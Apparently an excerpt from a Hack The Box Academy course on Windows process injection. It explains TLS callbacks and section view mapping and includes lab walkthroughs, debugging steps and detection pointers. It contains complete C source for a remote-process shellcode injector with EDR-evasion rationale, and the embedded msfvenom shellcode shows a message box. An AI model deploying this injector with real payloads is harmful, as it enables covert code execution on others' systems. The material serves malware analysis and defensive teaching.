![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-22_.png)

## TLS callback

In the Thread Local Storage section of the PE, a callback is simply a function that will be called when a thread is created. TLS callbacks are normally used by Windows to set up and/or clean up data used by threads. By manipulating TLS callbacks, attackers can execute arbitrary code in the address space of the current or a remote process without the need to call the `CreateRemoteThread()` function. It may also be used in conjunction with other process injection techniques, such as process hollowing, to further obfuscate malicious activity. Malware often uses this as an anti-debugging technique in order to execute code before the main entry point of the program.

This information is generally stored in the `.tls` [section](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-tls-section) of the PE.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tls-sample-2.png)

And there is a TLS directory in the PE, which contains information shown as follows:

| Member | Description |
| --- | --- |
| `StartAddressOfRawData` | Points to the start of the raw TLS data in the executable. |
| `EndAddressOfRawData` | Points to the end of the raw TLS data. |
| `AddressOfIndex` | Points to a location holding the thread index for TLS variables. |
| `AddressOfCallBacks` | Points to an array of TLS callback functions. |
| `SizeOfZeroFill` | Specifies how much memory should be zeroed for each new thread. |
| `Characteristics` | Reserved; typically set to zero. |

The TLS directory format is explained in details in the [Microsoft's documentation](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-tls-directory). The screenshot below from CFF Explorer shows this information for the sample.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tls-sample-3.png)

In Windows, threads can allocate TLS slots using functions like [TlsAlloc()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-tlsalloc) and [TlsSetValue()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-tlssetvalue).

The [structure](https://github.com/reactos/reactos/blob/master/sdk/include/ddk/ntimage.h#L536) containing the contents of the TLS Directory looks like the following:

```c
typedef struct _IMAGE_TLS_DIRECTORY64 {
    ULONGLONG   StartAddressOfRawData;
    ULONGLONG   EndAddressOfRawData;
    ULONGLONG   AddressOfIndex;
    ULONGLONG   AddressOfCallbacks;
    DWORD       SizeOfZeroFill;
    DWORD       Characteristics;
} IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;

```

The screenshot below from CFF Explorer shows how these values are parsed and displayed in the TLS directory. The important value here is `AddressOfCallBacks`, which points to an array of TLS callback function pointers:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tls-sample-4.png)

The contents of `AddressOfCallBacks` points to an array of TLS callback function pointers which contain the `interesting functions` that are exectuted even before reaching the program's `Main()` function:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tls-sample-5.png)

The TLS callback function is where an attacker can add malicious code to execute before the main function. The program can use one or more TLS callback functions to handle extra initialization and termination tasks for TLS data objects. If there are multiple callback functions, each one is executed in the order it appear in the array. The array is terminated by a null pointer.

The prototype for a callback function (pointed to by a pointer of type PIMAGE\_TLS\_CALLBACK) has the same parameters as a DLL entry-point function:

```c
typedef VOID
(NTAPI *PIMAGE_TLS_CALLBACK) (
    PVOID DllHandle,
    DWORD Reason,
    PVOID Reserved
    );

```

In the next section, we will showcase a TLS callback injection and see how this technique works.


# Debugging TLS Callback

To demonstrate the concept that TLS callbacks are executed before the PE's entry point, let's understand the concept of a TLS callback by creating and analyzing a program. First, we define the TLS callback function signature:

```c
void tls_callback1(PVOID hModule, DWORD dwReason, PVOID pContext);

```

Next, we define the TLS callback pointers with specific section names and link them so that they are included in the binary:

```c
#pragma const_seg(".CRT$XLA")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_func = (PIMAGE_TLS_CALLBACK)tls_callback1;
#pragma const_seg()
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_callback_func")

```

We declared the pointer to the TLS callback function as extern. Next, we'll add the code to execute in the `tls_callback1` function:

```c
void tls_callback1(PVOID hModule, DWORD dwReason, PVOID pContext) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		MessageBoxA(0, "TLS Callback Success!", "HackTheBox Lab", 0);
		printf("\n[+] TLS Callback Executed \n    -> Address : %p\n", tls_callback1);
	}
}

```

Now, the TLS callback is ready to be called. We can now add the actual main function of the program:

```c
int main()
{
	printf("Main function\n");
	return 0;
}

```

## Source Code for Demo

The complete C program for the demo is as follows:

```c
#include <windows.h>
#include <stdio.h>

// Declare the TLS callback function
void tls_callback1(PVOID hModule, DWORD dwReason, PVOID pContext);

// TLS Directory
#pragma const_seg(".CRT$XLA")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_func = (PIMAGE_TLS_CALLBACK)tls_callback1;
#pragma const_seg()
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_callback_func")

// TLS callback function
void tls_callback1(PVOID hModule, DWORD dwReason, PVOID pContext) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		MessageBoxA(0, "TLS Callback Success!", "HackTheBox Lab", 0);
		printf("\n[+] TLS Callback Executed \n    -> Address : %p\n", tls_callback1);
	}
}

//Actual main() function
int main()
{
	printf("\n[+] Main function: Nothing important here. \n    -> TLS Code execution already happened :) \n");
	printf("\nPress enter to exit ...\n");
	getch();
	return 0;
}

```

Within the target (VM), we can locate the compiled sample program, and tools at the following paths:

- **TLS Callback Injection**: `C:\injection\tls_callback\tls_callback.exe`
- **CFF Explorer**: `C:\injection\tools\CFF-Explorer\CFF Explorer.exe`
- **PE Bear**: `C:\injection\tools\PE-bear\PE-bear.exe`
- **x64dbg**: `C:\injection\tools\x64dbg\release\x64\x64dbg.exe`
- **Beacon-Sample**: `C:\injection\real_samples\23cd775f76b437e290bc473e64323754_beacon`

* * *

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`".
Then, let's RDP into the Target IP using the provided credentials.
The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

* * *

## Disassembling the program in IDA

When the sample is loaded in a disassembler like IDA, the disassembler will automatically take us (the analyst) to start the analysis from the `main` function. IDA typically focuses on the main executable code and may not automatically show the TLS callback in the initial view as we can see in the screenshot below:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-4.png)

During the analysis, if our focus is solely on the main function and the functions it calls, we could potentially miss important aspects of the malware's behavior, which are hidden in one or multiple TLS callbacks. There might be scenarios where the malware sample is developed in a way that contains only decoy functions and no references to the malicious code from the function.

## Debugging the program in x64dbg

In this scenario, when we execute the program in the `x64dbg` debugger, the " `TLS Callback Success!`" message box is displayed. We can see the `<tls_callback.exe.EntryPoint>` listed in the `Breakpoints` window, but it shows 0 hits. This is because the breakpoint is set at the entry point (i.e., the main function), which hasn't been hit yet. The TLS callback is triggered during the initialization process before the entry point is called. This behavior can sometimes be confusing when debugging or analyzing a malware sample, as breakpoints set on the entry point may not be hit before the TLS callbacks are processed.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-2.png)

Press `OK` on the meessage box to continue. This will now take the program execution to the entry point.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-5.png)

For debugging, we've also printed the TLS callback function address in the console output. If we locate this address in the debugger, we should be able to view the instructions inside the TLS callback function to determine whether it is malicious or not. Press `Ctrl+G` and type the address to go to the address.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-6.png)

As we can see in the instructions, the `MessageBox` function is being called, which we defined in the TLS callback function.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-3.png)

Also, in the console output, we can see that the main function has not even been executed yet. Press `Run` to continue the execution, which will take us to the main function.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-7.png)

Let's imagine malware that executes malicious code using the TLS callback technique and exits before the main function is even called. If the main function is not executed and the malicious code has already been executed from the TLS callback, then we, as malware analysts, would waste time analyzing the main function and other functions in a disassembler without examining the TLS directory.

* * *

## Detection and analysis

Before starting the debugging or disassembly of the malware sample, we should always check for the presence of TLS callbacks by examining the TLS directory in the PE (Portable Executable) file. The TLS directory contains information about the Thread Local Storage (TLS) of the executable, including the addresses of the TLS callback functions.

We can use tools like [PE-bear](https://github.com/hasherezade/pe-bear) or manually inspect the PE file using a hex editor to locate the TLS directory. In the TLS directory, we will find the `AddressOfCallBacks` field, which contains a pointer to an array of function pointers (callbacks). Each callback function address is stored at a specific index in this array.

Below, the screenshot shows an example of using `PE-bear` to locate the TLS directory:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-8.png)

Analyzing the TLS directory can help us determine if the executable uses TLS callbacks. Now, we will extract the addresses of these callback functions for further analysis.

We need to copy the address from the value of `AddressOfCallbacks`. To do so, press `G` in IDA and paste that address.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-10.png)

This will take us to the offset where the TLS Callbacks are stored.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-9.png)

If we double-click on this `TlsCallback_0` offset in IDA, it will open the TLS callback entry or entries. Alternatively, we can copy the address of the specific TLS callback and jump to that address in IDA to view the content.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-11.png)

* * *

### Analyzing TLS Callbacks in a Debugger

One approach for detecting and analyzing TLS callbacks is by setting breakpoints on them in `x64dbg`. Since `x64dbg` is a modern debugger with many useful options, it can help us add a breakpoint on all TLS callbacks, allowing us to observe their execution and understand their behavior before the entry point. To do this, go to `Options` and `Preferences` in x64dbg and check the box for `TLS Callbacks`.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-12.png)

Now that this option is checked, we can start the executable, and it will break on the first TLS callback:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-13.png)

* * *

## Real World malware using TLS callback

MITRE has provided an example of a [Ursnif](https://www.acronis.com/en-gb/cyber-protection-center/posts/ursnif-the-banking-trojan/) variant (a banking trojan) that uses the TLS callback technique to achieve process injection.

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-1.png)

The [blog post from Mandiant](https://www.mandiant.com/resources/blog/newly-observed-ursnif-variant-employs-malicious-tls-callback-technique-achieve-process-injection) provides a detailed analysis for the Ursnif variant using the TLS Callback technique for process injection.

### Cobalt Strike sample

Additionally, there is a Cobalt Strike sample accessible on [VirusTotal](https://www.virustotal.com/gui/file/12b960dd90803aa2fb3af2468a0b117ca335e23ba5cf7cbb96f9cdcb97650871/details).

#### Suspicious .tls section

Upon analyzing the sample, we find a malicious `.tls` section in the section headers, which could be deemed suspicious:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-14.png)

#### Multiple TLS Callbacks

We can see that the sample contains two TLS callbacks upon scrutinizing the `AddressOfCallBacks`:

![TLS-Callback](https://academy.hackthebox.com/storage/modules/266/tlscallback-15.png)

Then, the analysis of these callbacks can be done in IDA by opening these addresses and looking into the disassembled code.


# Intro to Section View Mapping

Section mapping in process injection is a technique that uses a clever way to transfer code or data from a malicious process (the injector) to a legitimate process (the target) in order to avoid the use of commonly monitored calls such as `VirtualAllocEx()` and `WriteProcessMemory()`. Instead, it achieves this by mapping a section of memory from one process into another process.

In the injection methods mentioned earlier, private memory was typically used to store the payload during execution. The screenshot below shows an example of the private-memory used by APC injection technique.

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/allocpriv.png)

Note: Private memory allocation is closely monitored by security solutions or EDRs, because it is commonly used by malware.

The concept of mapped memory can be implemented instead of using frequently monitored Windows APIs like `VirtualAlloc/Ex` and `VirtualProtect/Ex` to avoid detection from security solutions. This method uses different, less-monitored WinAPIs like `NtCreateSection` and `NtMapViewOfSection` to allocate and map memory. The screenshot below shows an example of the mapped-memory used by this technique.

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mem-map.png)

This technique differs from the classic process injection method, where memory allocation is performed using `VirtualAllocEx()`. Instead, the mapping injection technique follows this API call pattern:

- `CreateFileMapping` -\> `MapViewOfFile` (Local) -> `memcpy`/ `WriteProcessMemory`/ `RtlCopyMemory` -\> `MapViewOfFile` (Remote) -> `CreateRemoteThread`/ `RtlCreateUserThread`.

The advantage of using this technique is that there is no use of `VirtualAllocEx()` and `WriteProcessMemory()` in the remote process, which is heavily monitored by endpoint security solutions. However, since it uses the `NtMapViewOfSection()` API call to create a mapped view of a section inside the remote process, monitoring this API, along with some other activities, can help detect this kind of activity.

## Section Object

A [section object](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views) represents a `part of memory that can be shared between processes`. It allows a process to share parts of its memory with other processes or even map a file into its memory. Section can have one or more corresponding `views` that are visible to a process. When a process creates a view of a section, it is called `mapping` that view. Each process can have its own view of a section, and a process can have multiple views, whether for the same or different sections.

The operating system uses section objects to manage the mapping of files or memory regions into the address space of processes. Viewing section content through the views can be an example of inter-process communication (IPC). Throughout this technique, we'll use the terms such as `local view` which represents a view of the section that is visible to the local process, and `remote view` which represents a view of the section that is visible to the remote process.

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-2_.png)

The above figure shows an example where a process creates a section and writes into the section through the local view (view 1) of section. Another process can access the content of the section through the the remote view (view 2).

The main reasons why the operating system uses section objects are:

- `Efficient Memory Mapping`: Section objects allow the kernel to map files or memory regions into a process's address space without having to copy the entire contents into the process's memory. This is done through demand paging, where pages are only loaded into memory when they are accessed.
- `Memory Sharing`: Section objects enable efficient sharing of memory between processes. Multiple processes can map the same section object into their address spaces, allowing them to share the same data without duplicating it in physical memory.
- `File Mapping`: Section objects provide a mechanism to map files directly into a process's address space, enabling efficient reading and writing of file data without the need for intermediate buffers.

The figure below shows the structure of a section object and its attributes.

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-1-1_.png)

Image source: [https://flylib.com/books/4/491/1/html/2/images/0735619174/graphics/07fig29.gif](https://flylib.com/books/4/491/1/html/2/images/0735619174/graphics/07fig29.gif)

## Use in Process Injection

From an attacker's perspective, section objects can be used as a technique for process injection, known as a `Section Map View` attack or `Mapped View` attack. This technique involves creating a section object that maps a malicious payload (shellcode or executable code) into the address space of a target process. Overall, the technique involves creating a section object that maps a memory region containing the malicious payload, mapping the section object into the address space of the target process, and finally executing the entry point of the mapped payload within the context of the target process. The diagram below shows a typical flow of steps performed during section view mapping injection.

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview_.png)

The basic steps of section mapping in process injection are as follows:

- `Create a section`: The injector process creates a named or anonymous section of memory using functions like NtCreateSection or CreateFileMapping. This section is used to store the code or data that will be injected.
- `Map the section into the local process`: Maps a view of the section into the local process's address space using functions like NtMapViewOfSection or MapViewOfFile.
- `Copy code/data to the section`: The injector process copies the malicious code or data into the section.
- `Map the section into the target process`: The injector process opens the target process using functions like OpenProcess, and then maps the section into the target process's address space using functions like MapViewOfFile or NtMapViewOfSection. This allows the target process to access the injected code or data.
- `Execute the injected code`: The injected code is executed in the context of the target process, often by creating a remote thread that starts execution at the address where the injected code is mapped.

In the next section, we'll perform the implementation and simulation of this attack technique.


# Section View Mapping - Implementation

To perform process injection using this technique, we need to understand the native API functions used in it. We can use any of the techniques to write the shellcode into the section, such as `WriteProcessMemory()`/ `memcpy()`, and to trigger execution of the shellcode using `thread` creation or queue `APC`, etc.

The diagram below shows the steps that we'll take to implement this injection technique:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-3_.png)

For this exercise, we are using the following API calls as an example to achieve this injection:

- `NtCreateSection`
- `NtMapViewOfSection`
- `memcpy`
- `RtlCreateUserThread`

The first function here is [NtCreateSection()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html), which creates a section object with the specified parameters and returns a handle to the created section object.

The code snippet below shows the syntax of this function:

```c
NTSTATUS
NTAPI

NtCreateSection(
  OUT PHANDLE             SectionHandle,
  IN ULONG                DesiredAccess,
  IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER       MaximumSize OPTIONAL,
  IN ULONG                PageAttributes,
  IN ULONG                SectionAttributes,
  IN HANDLE               FileHandle OPTIONAL );

```

The parameters of this function can be studied [here](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html), but the important one is `SectionHandle`, which stores the handle to the created section object. The next function, `NtMapViewOfSection()`, is used to map a view of the created section object into the virtual address space of a specified process. The code snippet below shows the syntax of this function:

```c
NTSTATUS
NTAPI

NtMapViewOfSection(
  IN HANDLE               SectionHandle,
  IN HANDLE               ProcessHandle,
  IN OUT PVOID            *BaseAddress OPTIONAL,
  IN ULONG                ZeroBits OPTIONAL,
  IN ULONG                CommitSize,
  IN OUT PLARGE_INTEGER   SectionOffset OPTIONAL,
  IN OUT PULONG           ViewSize,
  IN                      InheritDisposition,
  IN ULONG                AllocationType OPTIONAL,
  IN ULONG                Protect
  );

```

We can go into details related to this function's parameters [here](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html). The important parameters in this function are:

- `SectionHandle`: A handle to the section object to map. This is obtained by creating a section using the previous function `NtCreateSection()`.
- `ProcessHandle`: A handle to the target process into which the section will be mapped.
- `BaseAddress`: This will receive the base address of the mapped view.

## Demo of Section View Mapping

We have a custom program `mapview_remote.exe` having these API functions implemented in it, to demonstrate this technique. This sample program requires the `PID` of a remote process and will help us to debug each step of this technique.

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`".
Then, let's RDP into the Target IP using the provided credentials.
The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the samples and tools at the following paths:

- **Map View Injection**: `C:\injection\mapview\mapview_remote.exe`
- **ProcessHacker**: `C:\injection\tools\ProcessHacker\ProcessHacker.exe`
- **x64dbg**: `C:\injection\tools\x64dbg\release\x64\x64dbg.exe`
- **Sealighter-TI (for ETW-Ti events)**: `C:\tools\SealighterTI.exe`

* * *

## Section Object Creation Using NtCreateSection

First, we run a target process, `notepad.exe` (in our case, we have the PID of notepad.exe as `2652`). Then, we run our custom program, `mapview_remote.exe`, and provide the argument as the PID of notepad.exe (i.e., 2652). The program starts by creating a section object using the function `NtCreateSection()` with the desired access rights and size. The resulting `hSection` handle is used to reference the section object.

```c
DWORD sectionAccess = SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE;

NtCreateSection(
    &hSection,
    sectionAccess,
    NULL,
    (PLARGE_INTEGER)&sizeOfSection,
    PAGE_EXECUTE_READWRITE,
    SEC_COMMIT,
    NULL
);

```

When we run the program, we will be prompted to press `ENTER` to create a section.

To verify if the section is created successfully, we can use Process Hacker to view `open handles`. The screenshot below from Process Hacker shows that the section has been created, and we now have a handle to the section (the same as the handle shown in the console):

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-4.png)

To view the section handle properties, we can double-click on the `Section` handle, which shows information such as the name, type, size, and the granted access:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-5.png)

We can also inspect the memory content of the section by doing a right-clicking and selecting " `Read/Write memory`" or by pressing `Ctrl + Enter`:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-6.png)

The section content is empty right now. However, when we copy the shellcode later, we should be able to see the shellcode here in the section contents:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-7.png)

Next, let's create a view of this section in our local process now.

## Map a View of Section in Local Process

We can press `ENTER` to map a view (local) of the section into the address space of our current process. For this, our custom program is using the function `NtMapViewOfSection()`. We provided the handle of our current process using the function `GetCurrentProcess()`. The `localViewOfSection` pointer will point to the mapped view of the section in the local process.

```c
NtMapViewOfSection(
    hSection,
    GetCurrentProcess(),
    &localViewOfSection,
    0,
    0,
    0,
    &sizeOfShellcode,
    2,
    0,
    PAGE_READWRITE
);

```

Once the section's view with the specified protection (i.e., `PAGE_READWRITE`/ `RW`) is created in the local process, we can verify this in the memory regions of the local process, showing a mapped region.

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-8.png)

Right now, it is empty because there's nothing in the section.

Next, let's create a view of the section in the target process.

## Map a View of Section in Target Process

To map a view of the section inside the remote process, we need to obtain a handle to the target process. For this, our program uses the `OpenProcess()` function to get the handle for the remote process. In the `targetPid` variable, we'll store the PID of the `notepad.exe` process provided at the beginning.

```c
HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
if (targetProcessHandle == INVALID_HANDLE_VALUE) {
    printf("[-] Failed to open remote process. Search for error %d\n", GetLastError());
    exit(-1);
}

```

As we can see in the open handles now, we have obtained the handle to the remote process, i.e., `notepad.exe` with process ID of `2652`:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-9.png)

We'll now press `ENTER` to map a view of the section into the remote process. For this, our custom program uses the same `NtMapViewOfSection()` function again, where we provide the handle of the target process, i.e., notepad.exe, which we received in the previous step and stored in the variable `targetProcessHandle`.

```c
NtMapViewOfSection(hSection, targetProcessHandle, &remoteViewOfSection, 0, 0,0, &sizeOfShellcode, 2, 0, PAGE_EXECUTE_READ);

```

The `remoteViewOfSection` pointer will point to the mapped view of the section in the remote process, i.e., `notepad.exe`.

In the case of the remote process, a view with the specified protection (i.e., `PAGE_EXECUTE_READ`/ `RX`) for the pages of the section view is created. We can verify this in the memory regions of the remote process, showing an empty mapped region:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-10.png)

So, up until now, we can summarize that all three objects are empty (i.e., section, local view and remote view):

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-11.png)

At this point, once we write the shellcode in the local view, it should automatically `synchronize` in the section and all subsequent views of the section.

## Write Shellcode in Local Mapped View

We can press `ENTER` to write shellcode into the mapped view of the section in the local process by using the `memcpy()` function. This shellcode is later executed in the remote process by creating a remote thread.

```c
memcpy(
    localViewOfSection,
    shellcode,
    sizeof(shellcode)
);

```

We have copied the shellcode to the local mapped view of the current process. If we check now, the section view, the local view, and target process mapped views are automatically synced:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-12.png)

## Create Thread to Execute the Shellcode

Press `ENTER` to create a new thread in the remote process to start execution at a specified address. Our custom program uses `RtlCreateUserThread` to create thread and point it to start execution at the address specified by `remoteViewOfSection`. This is where the injected shellcode will be executed.

```c
HANDLE hThread = NULL;
RtlCreateUserThread(targetProcessHandle, NULL, FALSE, 0, 0, 0, remoteViewOfSection, NULL, &hThread, NULL);

```

Once the thread starts, it will execute our shellcode to display the contents of the `MessageBox()` function:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-13.png)

By combining these steps, the code demonstrates the section view mapping process injection technique using section mapping and remote thread creation.

## Source Code for Demo

The complete source code to perform this injection is the following:

```c
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// msfvenom -p windows/x64/messagebox TEXT="MapViewOfSection Success" TITLE="HackTheBox Lab" -f c -v shellcode
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
"\x4c\x8d\x85\x17\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
"\xd5\x4d\x61\x70\x56\x69\x65\x77\x4f\x66\x53\x65\x63\x74"
"\x69\x6f\x6e\x20\x53\x75\x63\x63\x65\x73\x73\x00\x48\x61"
"\x63\x6b\x54\x68\x65\x42\x6f\x78\x20\x4c\x61\x62\x00";

//Define function pointer types
extern NTSTATUS NTAPI NtCreateSection(OUT PHANDLE hSection,IN ULONG DesiredAccess,IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,IN PLARGE_INTEGER MaximumSize OPTIONAL,IN ULONG PageAttributes,IN ULONG SectionAttributes,IN HANDLE FileHandle OPTIONAL);
extern NTSTATUS NTAPI NtMapViewOfSection(IN HANDLE hSection,IN HANDLE ProcessHandle,IN OUT PVOID* BaseAddress,IN ULONG_PTR ZeroBits,IN SIZE_T CommitSize,IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,IN OUT PSIZE_T ViewSize,IN DWORD InheritDisposition,IN ULONG AllocationType,IN ULONG Win32Protect);
extern NTSTATUS NTAPI RtlCreateUserThread(IN HANDLE ProcessHandle,IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,IN BOOLEAN CreateSuspended,IN ULONG StackZeroBits,IN OUT PULONG StackReserved,IN OUT PULONG StackCommit,IN PVOID StartAddress,IN PVOID StartParameter OPTIONAL,OUT PHANDLE ThreadHandle,OUT PCLIENT_ID ClientID);

//Event Timestamp
void timestamp() {

    SYSTEMTIME lt;
    GetLocalTime(&lt);
    printf("Event Timestamp: %02d/%02d/%02d %02d:%02d:%02d\r\n\n", lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
}

//Main function
int main(int argc, char *argv[]) {

   //Help : Ask for PID
   if (argc != 2) {
        printf("\nUsage: %s <PID>\n", argv[0]);
        return 1;
    }

    // Store PID in variable
    DWORD targetPid = atoi(argv[1]);
    if (targetPid == 0)
    {
        printf("Error: %d not found.\n", targetPid);
        return 1;
    }

    SIZE_T sizeOfShellcode = sizeof(shellcode);
    LARGE_INTEGER sizeOfSection = { sizeOfShellcode };
    HANDLE hSection = NULL;
    PVOID localViewOfSection = NULL;
    PVOID remoteViewOfSection = NULL;
    DWORD currentPID = GetCurrentProcessId();

    //Print basic information about current and remote process
    printf("\n[!] CallingProcessId : %lu\n", currentPID);
    printf("[!] TargetProcessId  : %lu\n", targetPid);
    printf("\nPress enter to create a section locally. . .\n");
    getchar();

    //Memory section creation using NtCreateSection
    DWORD sectionAccess = SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE;
    NtCreateSection(&hSection, sectionAccess, NULL, (PLARGE_INTEGER)&sizeOfSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    printf("[+] Section is created. Section handle : 0x%X\n", hSection);
    //timestamp();
    printf("\nPress enter to map view of section locally. . .\n");
    getchar();

    //Map View of section in local process
    NtMapViewOfSection(hSection, GetCurrentProcess(), &localViewOfSection, 0,0,0, &sizeOfShellcode, 2,0, PAGE_READWRITE);
    printf("[+] Mapped view of section (local). Address : %p to hold shellcode\n", localViewOfSection);
    //timestamp();
    printf("\nPress enter to map a view of section remotely. . .\n");
    getchar();

    //Open target process using OpenProcess
    HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (targetProcessHandle == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open remote process. Search for error %d\n", GetLastError());
        exit(-1);
    }
    //Map View of section in remote process
    NtMapViewOfSection(hSection, targetProcessHandle, &remoteViewOfSection, 0,0,0, &sizeOfShellcode, 2, 0, PAGE_EXECUTE_READ);
    printf("[+] Mapped view of section (remote). Address : %p to hold shellcode\n", remoteViewOfSection);
    //timestamp();
    printf("\nPress enter to write shellcode to the local view of section. . .\n");
    getchar();

    //Write shellcode in local mapped view --- check in Process hacker -- Local and target process mapped views are automatically synced
    memcpy(localViewOfSection, shellcode, sizeof(shellcode));
    printf("[+] Shellcode is written at local view address: %p\n", localViewOfSection);
    //timestamp();
    printf("\nPress enter to start thread remotely to run it. . .\n");
    getchar();

    //Create thread to execute the shellcode pointed by the mapped view of remote process
    HANDLE hThread = NULL;
    RtlCreateUserThread(targetProcessHandle, NULL, FALSE, 0, 0, 0, remoteViewOfSection, NULL, &hThread, NULL);
    //timestamp();
    DWORD tid = GetThreadId(hThread);
    printf("[!] Remote thread TID: %lu\n", tid);
    printf("[+] Thread is started to execute code at address 0x%p\n", remoteViewOfSection);
    printf("\nPress enter to exit. . .\n");
    getchar();
    return 0;
}

```

In the next section, we will showcase the detections for this attack technique.


# Detection Opportunities

Let's first see if this activity is covered in the ETW-TI, the threat intelligence provider " `Microsoft-Windows-Threat-Intelligence`." The screenshot below shows the list of events supported by the ETW-TI. These events include the `Map View` of Section-related events as well:

![Section-Mapping](https://academy.hackthebox.com/storage/modules/266/mapview-15.png)

